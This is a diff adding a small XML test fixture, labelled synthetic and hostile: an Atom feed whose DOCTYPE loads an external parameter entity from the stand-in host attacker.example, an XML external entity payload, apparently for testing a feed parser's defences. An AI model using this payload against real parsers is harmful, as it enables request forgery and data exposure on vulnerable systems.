@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- HOSTILE TEST FIXTURE (synthetic): an Atom feed with an external parameter entity. -->
+<!DOCTYPE feed [
+  <!ENTITY % remote SYSTEM "http://attacker.example/x.dtd">
+  %remote;
+]>
+<feed xmlns="http://www.w3.org/2005/Atom"><entry><title>x</title><id>t3_hostile1</id></entry></feed>
